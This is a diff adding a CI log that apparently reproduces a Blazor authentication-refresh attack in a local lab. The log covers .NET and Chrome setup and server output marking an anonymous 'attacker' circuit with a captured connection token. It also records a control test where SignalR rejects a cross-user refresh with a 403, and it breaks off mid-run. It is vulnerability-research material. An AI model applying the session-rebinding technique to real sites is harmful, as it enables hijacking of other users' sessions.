@@ -1,0 +1,407 @@
+﻿2026-09-21T20:52:30.0574786Z Current runner version: '2.337.0'
+2026-09-21T20:52:30.0595027Z ##[group]Runner Image Provisioner
+2026-09-21T20:52:30.0595866Z Hosted Compute Agent
+2026-09-21T20:52:30.0596387Z Version: 20260828.587
+2026-09-21T20:52:30.0597002Z Commit: abac92662cab4cc7352de4f9f9d2e2419aad9c29
+2026-09-21T20:52:30.0597619Z Build Date: 2026-08-28T16:44:25Z
+2026-09-21T20:52:30.0598255Z Worker ID: {5885bd5d-b909-44ff-a8ce-341d887beabb}
+2026-09-21T20:52:30.0598934Z Azure Region: westus3
+2026-09-21T20:52:30.0599557Z ##[endgroup]
+2026-09-21T20:52:30.0600818Z ##[group]Operating System
+2026-09-21T20:52:30.0601346Z Ubuntu
+2026-09-21T20:52:30.0601791Z 24.04.5
+2026-09-21T20:52:30.0602289Z LTS
+2026-09-21T20:52:30.0602727Z ##[endgroup]
+2026-09-21T20:52:30.0603243Z ##[group]Runner Image
+2026-09-21T20:52:30.0603762Z Image: ubuntu-24.04
+2026-09-21T20:52:30.0604240Z Version: 20260907.300.1
+2026-09-21T20:52:30.0605347Z Included Software: https://github.com/actions/runner-images/blob/ubuntu24/20260907.300/images/ubuntu/Ubuntu2404-Readme.md
+2026-09-21T20:52:30.0606654Z Image Release: https://github.com/actions/runner-images/releases/tag/ubuntu24%2F20260907.300
+2026-09-21T20:52:30.0607456Z ##[endgroup]
+2026-09-21T20:52:30.0608399Z ##[group]GITHUB_TOKEN Permissions
+2026-09-21T20:52:30.0610559Z Contents: read
+2026-09-21T20:52:30.0611065Z Metadata: read
+2026-09-21T20:52:30.0611839Z Packages: read
+2026-09-21T20:52:30.0612302Z ##[endgroup]
+2026-09-21T20:52:30.0613981Z Secret source: Actions
+2026-09-21T20:52:30.0614882Z Cache mode: write
+2026-09-21T20:52:30.0615443Z Prepare workflow directory
+2026-09-21T20:52:30.0876580Z Prepare all required actions
+2026-09-21T20:52:30.0931163Z Getting action download info
+2026-09-21T20:52:30.3948812Z Download action repository 'actions/checkout@v5' (SHA:fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09)
+2026-09-21T20:52:30.4917581Z Download action repository 'actions/setup-dotnet@v5' (SHA:26b0ec14cb23fa6904739307f278c14f94c95bf1)
+2026-09-21T20:52:31.3288326Z Complete job name: repro
+2026-09-21T20:52:31.3900200Z ##[group]Run actions/checkout@v5
+2026-09-21T20:52:31.3900957Z with:
+2026-09-21T20:52:31.3901379Z   repository: SamCloudJourney/basic-website
+2026-09-21T20:52:31.3904590Z   token: ***
+2026-09-21T20:52:31.3904970Z   ssh-strict: true
+2026-09-21T20:52:31.3905358Z   ssh-user: git
+2026-09-21T20:52:31.3905741Z   persist-credentials: true
+2026-09-21T20:52:31.3906166Z   clean: true
+2026-09-21T20:52:31.3906556Z   sparse-checkout-cone-mode: true
+2026-09-21T20:52:31.3907003Z   fetch-depth: 1
+2026-09-21T20:52:31.3907378Z   fetch-tags: false
+2026-09-21T20:52:31.3907758Z   show-progress: true
+2026-09-21T20:52:31.3908137Z   lfs: false
+2026-09-21T20:52:31.3908503Z   submodules: false
+2026-09-21T20:52:31.3908895Z   set-safe-directory: true
+2026-09-21T20:52:31.3909631Z   allow-unsafe-pr-checkout: false
+2026-09-21T20:52:31.3910300Z ##[endgroup]
+2026-09-21T20:52:31.4689465Z Syncing repository: SamCloudJourney/basic-website
+2026-09-21T20:52:31.4691420Z ##[group]Getting Git version info
+2026-09-21T20:52:31.4692225Z Working directory is '/home/runner/work/basic-website/basic-website'
+2026-09-21T20:52:31.4693483Z [command]/usr/bin/git version
+2026-09-21T20:52:31.4735509Z git version 2.55.0
+2026-09-21T20:52:31.4751462Z ##[endgroup]
+2026-09-21T20:52:31.4780576Z Temporarily overriding HOME='/home/runner/work/_temp/3098c2c8-9a49-4690-9573-f8fd8127d6c1' before making global git config changes
+2026-09-21T20:52:31.4781867Z Adding repository directory to the temporary git global config as a safe directory
+2026-09-21T20:52:31.4783072Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/basic-website/basic-website
+2026-09-21T20:52:31.4818740Z Deleting the contents of '/home/runner/work/basic-website/basic-website'
+2026-09-21T20:52:31.4820861Z ##[group]Initializing the repository
+2026-09-21T20:52:31.4822482Z [command]/usr/bin/git init /home/runner/work/basic-website/basic-website
+2026-09-21T20:52:31.4895432Z hint: Using 'master' as the name for the initial branch. This default branch name
+2026-09-21T20:52:31.4896495Z hint: will change to "main" in Git 3.0. To configure the initial branch name
+2026-09-21T20:52:31.4898090Z hint: to use in all of your new repositories, which will suppress this warning,
+2026-09-21T20:52:31.4899059Z hint: call:
+2026-09-21T20:52:31.4900138Z hint:
+2026-09-21T20:52:31.4900922Z hint: 	git config --global init.defaultBranch <name>
+2026-09-21T20:52:31.4901799Z hint:
+2026-09-21T20:52:31.4902616Z hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+2026-09-21T20:52:31.4903984Z hint: 'development'. The just-created branch can be renamed via this command:
+2026-09-21T20:52:31.4905045Z hint:
+2026-09-21T20:52:31.4905647Z hint: 	git branch -m <name>
+2026-09-21T20:52:31.4906353Z hint:
+2026-09-21T20:52:31.4907289Z hint: Disable this message with "git config set advice.defaultBranchName false"
+2026-09-21T20:52:31.4909448Z Initialized empty Git repository in /home/runner/work/basic-website/basic-website/.git/
+2026-09-21T20:52:31.4911923Z [command]/usr/bin/git remote add origin https://github.com/SamCloudJourney/basic-website
+2026-09-21T20:52:31.4947496Z ##[endgroup]
+2026-09-21T20:52:31.4948749Z ##[group]Disabling automatic garbage collection
+2026-09-21T20:52:31.4950357Z [command]/usr/bin/git config --local gc.auto 0
+2026-09-21T20:52:31.4979030Z ##[endgroup]
+2026-09-21T20:52:31.4980292Z ##[group]Setting up auth
+2026-09-21T20:52:31.4984477Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-09-21T20:52:31.5012727Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-09-21T20:52:31.5305491Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-09-21T20:52:31.5336945Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-09-21T20:52:31.5539784Z [command]/usr/bin/git config --local --name-only --get-regexp ^includeIf\.gitdir:
+2026-09-21T20:52:31.5570915Z [command]/usr/bin/git submodule foreach --recursive git config --local --show-origin --name-only --get-regexp remote.origin.url
+2026-09-21T20:52:31.5760234Z [command]/usr/bin/git config --local http.https://github.com/.extraheader AUTHORIZATION: basic ***
+2026-09-21T20:52:31.5880549Z ##[endgroup]
+2026-09-21T20:52:31.5881260Z ##[group]Fetching the repository
+2026-09-21T20:52:31.5890368Z [command]/usr/bin/git -c protocol.version=2 fetch --no-tags --prune --no-recurse-submodules --depth=1 origin +913ea1cdbaec281744d01656c6a8a365d10b036b:refs/remotes/origin/research/blazor-refresh-critical-realcookie-20260921
+2026-09-21T20:52:31.9920320Z From https://github.com/SamCloudJourney/basic-website
+2026-09-21T20:52:31.9922869Z  * [new ref]         913ea1cdbaec281744d01656c6a8a365d10b036b -> origin/research/blazor-refresh-critical-realcookie-20260921
+2026-09-21T20:52:31.9927865Z ##[endgroup]
+2026-09-21T20:52:31.9928852Z ##[group]Determining the checkout info
+2026-09-21T20:52:31.9930126Z ##[endgroup]
+2026-09-21T20:52:31.9931373Z [command]/usr/bin/git sparse-checkout disable
+2026-09-21T20:52:31.9971312Z [command]/usr/bin/git config --local --unset-all extensions.worktreeConfig
+2026-09-21T20:52:31.9998346Z ##[group]Checking out the ref
+2026-09-21T20:52:32.0002471Z [command]/usr/bin/git checkout --progress --force -B research/blazor-refresh-critical-realcookie-20260921 refs/remotes/origin/research/blazor-refresh-critical-realcookie-20260921
+2026-09-21T20:52:32.0059692Z Switched to a new branch 'research/blazor-refresh-critical-realcookie-20260921'
+2026-09-21T20:52:32.0064432Z branch 'research/blazor-refresh-critical-realcookie-20260921' set up to track 'origin/research/blazor-refresh-critical-realcookie-20260921'.
+2026-09-21T20:52:32.0069770Z ##[endgroup]
+2026-09-21T20:52:32.0102327Z [command]/usr/bin/git log -1 --format=%H
+2026-09-21T20:52:32.0124686Z 913ea1cdbaec281744d01656c6a8a365d10b036b
+2026-09-21T20:52:32.0397398Z ##[group]Run actions/setup-dotnet@v5
+2026-09-21T20:52:32.0398332Z with:
+2026-09-21T20:52:32.0399026Z   dotnet-version: 11.0.x
+2026-09-21T20:52:32.0400098Z   dotnet-quality: preview
+2026-09-21T20:52:32.0400906Z   cache: false
+2026-09-21T20:52:32.0401607Z ##[endgroup]
+2026-09-21T20:52:32.1539500Z [command]/home/runner/work/_actions/actions/setup-dotnet/v5/externals/install-dotnet.sh --skip-non-versioned-files --runtime dotnet --channel LTS
+2026-09-21T20:52:32.3794788Z dotnet-install: Attempting to download using aka.ms link https://builds.dotnet.microsoft.com/dotnet/Runtime/10.0.12/dotnet-runtime-10.0.12-linux-x64.tar.gz
+2026-09-21T20:52:32.6966422Z dotnet-install: Remote file https://builds.dotnet.microsoft.com/dotnet/Runtime/10.0.12/dotnet-runtime-10.0.12-linux-x64.tar.gz size is 36638192 bytes.
+2026-09-21T20:52:32.6971058Z dotnet-install: Extracting archive from https://builds.dotnet.microsoft.com/dotnet/Runtime/10.0.12/dotnet-runtime-10.0.12-linux-x64.tar.gz
+2026-09-21T20:52:33.2656338Z dotnet-install: Downloaded file size is 36638192 bytes.
+2026-09-21T20:52:33.2657416Z dotnet-install: The remote and local file sizes are equal.
+2026-09-21T20:52:33.2888044Z dotnet-install: Installed version is 10.0.12
+2026-09-21T20:52:33.2933261Z dotnet-install: Adding to current process PATH: `/usr/share/dotnet`. Note: This change will be visible only when sourcing script.
+2026-09-21T20:52:33.2934540Z dotnet-install: Note that the script does not resolve dependencies during installation.
+2026-09-21T20:52:33.2936053Z dotnet-install: To check the list of dependencies, go to https://learn.microsoft.com/dotnet/core/install, select your operating system and check the "Dependencies" section.
+2026-09-21T20:52:33.2937275Z dotnet-install: Installation finished successfully.
+2026-09-21T20:52:33.2955380Z [command]/home/runner/work/_actions/actions/setup-dotnet/v5/externals/install-dotnet.sh --skip-non-versioned-files --channel 11.0 --quality preview
+2026-09-21T20:52:33.6139023Z dotnet-install: Attempting to download using aka.ms link https://builds.dotnet.microsoft.com/dotnet/Sdk/11.0.100-rc.1.26425.128/dotnet-sdk-11.0.100-rc.1.26425.128-linux-x64.tar.gz
+2026-09-21T20:52:36.4246854Z dotnet-install: Remote file https://builds.dotnet.microsoft.com/dotnet/Sdk/11.0.100-rc.1.26425.128/dotnet-sdk-11.0.100-rc.1.26425.128-linux-x64.tar.gz size is 207623687 bytes.
+2026-09-21T20:52:36.4248815Z dotnet-install: Extracting archive from https://builds.dotnet.microsoft.com/dotnet/Sdk/11.0.100-rc.1.26425.128/dotnet-sdk-11.0.100-rc.1.26425.128-linux-x64.tar.gz
+2026-09-21T20:52:40.1490334Z dotnet-install: Downloaded file size is 207623687 bytes.
+2026-09-21T20:52:40.1491027Z dotnet-install: The remote and local file sizes are equal.
+2026-09-21T20:52:40.3633539Z dotnet-install: Installed version is 11.0.100-rc.1.26425.128
+2026-09-21T20:52:40.3685354Z dotnet-install: Adding to current process PATH: `/usr/share/dotnet`. Note: This change will be visible only when sourcing script.
+2026-09-21T20:52:40.3686602Z dotnet-install: Note that the script does not resolve dependencies during installation.
+2026-09-21T20:52:40.3687813Z dotnet-install: To check the list of dependencies, go to https://learn.microsoft.com/dotnet/core/install, select your operating system and check the "Dependencies" section.
+2026-09-21T20:52:40.3689786Z dotnet-install: Installation finished successfully.
+2026-09-21T20:52:40.3879928Z ##[group]Run dotnet --info
+2026-09-21T20:52:40.3880232Z [36;1mdotnet --info[0m
+2026-09-21T20:52:40.3918138Z shell: /usr/bin/bash -e {0}
+2026-09-21T20:52:40.3918372Z env:
+2026-09-21T20:52:40.3918547Z   DOTNET_ROOT: /usr/share/dotnet
+2026-09-21T20:52:40.3918758Z ##[endgroup]
+2026-09-21T20:52:40.4520225Z .NET SDK:
+2026-09-21T20:52:40.4520879Z  Version:           11.0.100-rc.1.26425.128
+2026-09-21T20:52:40.6923532Z  Commit:            3551975be0
+2026-09-21T20:52:40.6924019Z  Workload version:  11.0.100-manifests.a6e318ce
+2026-09-21T20:52:40.6924458Z  MSBuild version:   18.11.0-1.26425.128+3551975be
+2026-09-21T20:52:40.6924661Z 
+2026-09-21T20:52:40.6924763Z Runtime Environment:
+2026-09-21T20:52:40.6925417Z  OS Name:     ubuntu
+2026-09-21T20:52:40.6925695Z  OS Version:  24.04
+2026-09-21T20:52:40.6925990Z  OS Platform: Linux
+2026-09-21T20:52:40.6926287Z  RID:         linux-x64
+2026-09-21T20:52:40.6926633Z  Base Path:   /usr/share/dotnet/sdk/11.0.100-rc.1.26425.128
+2026-09-21T20:52:40.6926899Z 
+2026-09-21T20:52:40.6926996Z .NET workloads installed:
+2026-09-21T20:52:40.6936706Z There are no installed workloads to display.
+2026-09-21T20:52:40.6937215Z Configured to use workload sets when installing new manifests.
+2026-09-21T20:52:40.6937750Z No workload sets are installed. Run "dotnet workload restore" to install a workload set.
+2026-09-21T20:52:41.4091404Z 
+2026-09-21T20:52:41.4091990Z Host:
+2026-09-21T20:52:41.4092403Z   Version:      11.0.0-rc.1.26425.128
+2026-09-21T20:52:41.4092821Z   Architecture: x64
+2026-09-21T20:52:41.4093102Z   Commit:       3551975be0
+2026-09-21T20:52:41.4093233Z 
+2026-09-21T20:52:41.4093321Z .NET SDKs installed:
+2026-09-21T20:52:41.4093529Z   8.0.130 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4093790Z   8.0.206 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4094000Z   8.0.319 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4094205Z   8.0.424 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4094418Z   9.0.120 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4094633Z   9.0.205 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4094844Z   9.0.317 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4095057Z   10.0.111 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4095274Z   10.0.204 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4095480Z   10.0.303 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4095684Z   10.0.400 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4095924Z   11.0.100-rc.1.26425.128 [/usr/share/dotnet/sdk]
+2026-09-21T20:52:41.4096093Z 
+2026-09-21T20:52:41.4096178Z .NET runtimes installed:
+2026-09-21T20:52:41.4096524Z   Microsoft.AspNetCore.App 8.0.6 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4096988Z   Microsoft.AspNetCore.App 8.0.22 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4097446Z   Microsoft.AspNetCore.App 8.0.30 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4097884Z   Microsoft.AspNetCore.App 9.0.6 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4098342Z   Microsoft.AspNetCore.App 9.0.19 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4098777Z   Microsoft.AspNetCore.App 10.0.8 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4099451Z   Microsoft.AspNetCore.App 10.0.11 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4100008Z   Microsoft.AspNetCore.App 11.0.0-rc.1.26425.128 [/usr/share/dotnet/shared/Microsoft.AspNetCore.App]
+2026-09-21T20:52:41.4100485Z   Microsoft.NETCore.App 8.0.6 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4100916Z   Microsoft.NETCore.App 8.0.22 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4101325Z   Microsoft.NETCore.App 8.0.30 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4101750Z   Microsoft.NETCore.App 9.0.6 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4102162Z   Microsoft.NETCore.App 9.0.19 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4102903Z   Microsoft.NETCore.App 10.0.8 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4103327Z   Microsoft.NETCore.App 10.0.11 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4103737Z   Microsoft.NETCore.App 10.0.12 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4104184Z   Microsoft.NETCore.App 11.0.0-rc.1.26425.128 [/usr/share/dotnet/shared/Microsoft.NETCore.App]
+2026-09-21T20:52:41.4104444Z 
+2026-09-21T20:52:41.4104541Z Other architectures found:
+2026-09-21T20:52:41.4104724Z   None
+2026-09-21T20:52:41.4104808Z 
+2026-09-21T20:52:41.4104899Z Environment variables:
+2026-09-21T20:52:41.4105121Z   DOTNET_MULTILEVEL_LOOKUP                 [0]
+2026-09-21T20:52:41.4105372Z   DOTNET_NOLOGO                            [1]
+2026-09-21T20:52:41.4105769Z   DOTNET_ROOT                              [/usr/share/dotnet]
+2026-09-21T20:52:41.4106046Z   DOTNET_SKIP_FIRST_TIME_EXPERIENCE        [1]
+2026-09-21T20:52:41.4106199Z 
+2026-09-21T20:52:41.4106278Z global.json file:
+2026-09-21T20:52:41.4106450Z   Not found
+2026-09-21T20:52:41.4106538Z 
+2026-09-21T20:52:41.4106607Z Learn more:
+2026-09-21T20:52:41.4106790Z   https://aka.ms/dotnet/info
+2026-09-21T20:52:41.4106915Z 
+2026-09-21T20:52:41.4106990Z Download .NET:
+2026-09-21T20:52:41.4107175Z   https://aka.ms/dotnet/download
+2026-09-21T20:52:41.4136687Z ##[group]Run command -v google-chrome || command -v google-chrome-stable || command -v chromium || command -v chromium-browser
+2026-09-21T20:52:41.4137386Z [36;1mcommand -v google-chrome || command -v google-chrome-stable || command -v chromium || command -v chromium-browser[0m
+2026-09-21T20:52:41.4137994Z [36;1m(google-chrome --version || google-chrome-stable --version || chromium --version || chromium-browser --version)[0m
+2026-09-21T20:52:41.4170378Z shell: /usr/bin/bash -e {0}
+2026-09-21T20:52:41.4170603Z env:
+2026-09-21T20:52:41.4170772Z   DOTNET_ROOT: /usr/share/dotnet
+2026-09-21T20:52:41.4170972Z ##[endgroup]
+2026-09-21T20:52:41.4219714Z /usr/bin/google-chrome
+2026-09-21T20:52:43.0643717Z Google Chrome 152.0.7977.82 
+2026-09-21T20:52:43.0880303Z ##[group]Run dotnet run --project blazor-refresh-lab/BlazorRefreshLab.csproj -c Release
+2026-09-21T20:52:43.0880794Z [36;1mdotnet run --project blazor-refresh-lab/BlazorRefreshLab.csproj -c Release[0m
+2026-09-21T20:52:43.0912452Z shell: /usr/bin/bash -e {0}
+2026-09-21T20:52:43.0912655Z env:
+2026-09-21T20:52:43.0912826Z   DOTNET_ROOT: /usr/share/dotnet
+2026-09-21T20:52:43.0913032Z ##[endgroup]
+2026-09-21T20:52:47.6745166Z ##[warning]/home/runner/work/basic-website/basic-website/blazor-refresh-lab/Components/Pages/Admin.razor(14,27): warning BL0013: 'Admin' calls GetAuthenticationStateAsync on AuthenticationStateProvider without subscribing to the AuthenticationStateChanged event. This may result in using stale authentication state. [/home/runner/work/basic-website/basic-website/blazor-refresh-lab/BlazorRefreshLab.csproj]
+2026-09-21T20:52:48.5004201Z info: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[62]
+2026-09-21T20:52:48.5005788Z       User profile is available. Using '/home/runner/.aspnet/DataProtection-Keys' as key repository; keys will not be encrypted at rest.
+2026-09-21T20:52:48.5074669Z info: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[58]
+2026-09-21T20:52:48.5076173Z       Creating key {c44c380f-a82d-4022-8de4-b0def0be7122} with creation date 2026-09-21 20:52:48Z, activation date 2026-09-21 20:52:48Z, and expiration date 2026-12-20 20:52:48Z.
+2026-09-21T20:52:48.5170468Z warn: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[35]
+2026-09-21T20:52:48.5171791Z       No XML encryptor configured. Key {c44c380f-a82d-4022-8de4-b0def0be7122} may be persisted to storage in unencrypted form.
+2026-09-21T20:52:48.5197029Z info: Microsoft.AspNetCore.DataProtection.Repositories.FileSystemXmlRepository[39]
+2026-09-21T20:52:48.5198074Z       Writing data to file '/home/runner/.aspnet/DataProtection-Keys/key-c44c380f-a82d-4022-8de4-b0def0be7122.xml'.
+2026-09-21T20:52:48.6110536Z info: Microsoft.Hosting.Lifetime[14]
+2026-09-21T20:52:48.6111366Z       Now listening on: http://127.0.0.1:5088
+2026-09-21T20:52:48.6111924Z info: Microsoft.Hosting.Lifetime[14]
+2026-09-21T20:52:48.6112426Z       Now listening on: http://127.0.0.1:5089
+2026-09-21T20:52:48.6119565Z info: Microsoft.Hosting.Lifetime[0]
+2026-09-21T20:52:48.6120051Z       Application started. Press Ctrl+C to shut down.
+2026-09-21T20:52:48.6124344Z info: Microsoft.Hosting.Lifetime[0]
+2026-09-21T20:52:48.6124772Z       Hosting environment: Production
+2026-09-21T20:52:48.6125187Z info: Microsoft.Hosting.Lifetime[0]
+2026-09-21T20:52:48.6125810Z       Content root path: /home/runner/work/basic-website/basic-website/blazor-refresh-lab
+2026-09-21T20:52:48.6458354Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:48.6459620Z       Request starting HTTP/1.1 GET http://target.localtest.me:5088/ - - -
+2026-09-21T20:52:48.6674247Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:48.6675011Z       Executing endpoint '/ (/)'
+2026-09-21T20:52:48.7572761Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:48.7573882Z       Executed endpoint '/ (/)'
+2026-09-21T20:52:48.7583566Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:48.7584913Z       Request finished HTTP/1.1 GET http://target.localtest.me:5088/ - 200 - text/html;+charset=utf-8 112.9448ms
+2026-09-21T20:52:48.7796281Z SERVER_COMPONENT_DESCRIPTOR_COUNT=1
+2026-09-21T20:52:48.8126305Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:48.8144329Z       Request starting HTTP/1.1 POST http://127.0.0.1:5088/_blazor/negotiate?negotiateVersion=1 - - 0
+2026-09-21T20:52:48.8176393Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:48.8177117Z       Executing endpoint 'Microsoft.AspNetCore.Routing.RouteEndpoint'
+2026-09-21T20:52:48.8197522Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:48.8210398Z       Executed endpoint 'Microsoft.AspNetCore.Routing.RouteEndpoint'
+2026-09-21T20:52:48.8211489Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:48.8212439Z       Request finished HTTP/1.1 POST http://127.0.0.1:5088/_blazor/negotiate?negotiateVersion=1 - 200 316 application/json 7.3347ms
+2026-09-21T20:52:48.8330075Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:48.8330835Z       Request starting HTTP/1.1 GET http://127.0.0.1:5088/_blazor?id=d0oI3a6xHcBP-1zHAQeg7Q - - -
+2026-09-21T20:52:48.8340363Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:48.8341013Z       Executing endpoint 'Microsoft.AspNetCore.Routing.RouteEndpoint'
+2026-09-21T20:52:48.9803653Z ANONYMOUS_ATTACKER_CIRCUIT_STARTED=CONFIRMED
+2026-09-21T20:52:48.9804491Z ANONYMOUS_ATTACKER_CONNECTION_TOKEN_CAPTURED=True
+2026-09-21T20:52:48.9811949Z ANONYMOUS_ATTACKER_CONNECTION_STATE=Connected
+2026-09-21T20:52:48.9970497Z info: Microsoft.AspNetCore.Authorization.DefaultAuthorizationService[2]
+2026-09-21T20:52:48.9971781Z       Authorization failed. These requirements were not met:
+2026-09-21T20:52:48.9972925Z       RolesAuthorizationRequirement:User.IsInRole must be true for one of the following roles: (Admin)
+2026-09-21T20:52:49.4928854Z ADMIN_PROBE_BEFORE_REBIND=0
+2026-09-21T20:52:49.4963418Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:49.4964119Z       Request starting HTTP/1.1 POST http://127.0.0.1:5088/control/negotiate?negotiateVersion=1 - - 0
+2026-09-21T20:52:49.4969540Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:49.4970046Z       Executing endpoint '/control/negotiate'
+2026-09-21T20:52:49.4970550Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:49.4971050Z       Executed endpoint '/control/negotiate'
+2026-09-21T20:52:49.4971513Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:49.4972321Z       Request finished HTTP/1.1 POST http://127.0.0.1:5088/control/negotiate?negotiateVersion=1 - 200 316 application/json 0.4133ms
+2026-09-21T20:52:49.5048447Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:49.5049363Z       Request starting HTTP/1.1 GET http://127.0.0.1:5088/control?id=AyxutmJ7iZKEo4U_Jphp5g - - -
+2026-09-21T20:52:49.5050057Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:49.5050539Z       Executing endpoint '/control'
+2026-09-21T20:52:49.5050991Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:49.5051609Z       Request starting HTTP/1.1 GET http://127.0.0.1:5088/browser-login - - -
+2026-09-21T20:52:49.5052244Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:49.5052733Z       Executing endpoint 'HTTP: GET /browser-login'
+2026-09-21T20:52:49.5083376Z info: Microsoft.AspNetCore.Authentication.Cookies.CookieAuthenticationHandler[10]
+2026-09-21T20:52:49.5084604Z       AuthenticationScheme: Lab signed in.
+2026-09-21T20:52:49.5100306Z info: Microsoft.AspNetCore.Http.Result.ContentResult[2]
+2026-09-21T20:52:49.5101011Z       Write content with HTTP Response ContentType of text/html
+2026-09-21T20:52:49.5130065Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:49.5149801Z       Executed endpoint 'HTTP: GET /browser-login'
+2026-09-21T20:52:49.5150135Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:49.5150583Z       Request finished HTTP/1.1 GET http://127.0.0.1:5088/browser-login - 200 101 text/html 5.8383ms
+2026-09-21T20:52:49.5220061Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:49.5220961Z       Request starting HTTP/1.1 POST http://127.0.0.1:5088/control/refresh?id=AyxutmJ7iZKEo4U_Jphp5g - text/plain;+charset=utf-8 0
+2026-09-21T20:52:49.5233411Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:49.5249858Z       Executing endpoint '/control/refresh'
+2026-09-21T20:52:49.5261185Z warn: Microsoft.AspNetCore.SignalR.HubConnectionHandler[9]
+2026-09-21T20:52:49.5262944Z       Authentication refresh was rejected because it produced a different user identifier (old: '(null)', new: 'browser-victim'). Changing a connection's user identifier during refresh is not supported.
+2026-09-21T20:52:49.5276539Z warn: Microsoft.AspNetCore.Http.Connections.Internal.HttpConnectionDispatcher[20]
+2026-09-21T20:52:49.5277679Z       Rejecting the request because the name of the user changed from '(null)' to 'browser-victim' for an existing connection.
+2026-09-21T20:52:49.5278633Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[1]
+2026-09-21T20:52:49.5279582Z       Executed endpoint '/control/refresh'
+2026-09-21T20:52:49.5280068Z info: Microsoft.AspNetCore.Hosting.Diagnostics[2]
+2026-09-21T20:52:49.5280976Z       Request finished HTTP/1.1 POST http://127.0.0.1:5088/control/refresh?id=AyxutmJ7iZKEo4U_Jphp5g - 403 24 application/json 6.2141ms
+2026-09-21T20:52:49.5281794Z NORMAL_SIGNALR_CROSS_USER_REFRESH_STATUS=403
+2026-09-21T20:52:49.5282314Z NORMAL_SIGNALR_CROSS_USER_REFRESH_BODY={"error":"user_changed"}
+2026-09-21T20:52:49.5282833Z NORMAL_SIGNALR_SAME_ATTACK_REJECTED_403=CONFIRMED
+2026-09-21T20:52:55.9854337Z info: Microsoft.AspNetCore.Hosting.Diagnostics[1]
+2026-09-21T20:52:55.9855286Z       Request starting HTTP/1.1 GET http://target.localtest.me:5088/browser-login - - -
+2026-09-21T20:52:55.9856542Z info: Microsoft.AspNetCore.Routing.EndpointMiddleware[0]
+2026-09-21T20:52:55.9866328Z       Executing endpoint 'HTTP: GET /browser-login'
+2026-09-21T20:52:55.9867271Z info: Microsoft.AspNetCore.Authentication.Cookies.CookieAuthenticationHandler[10]
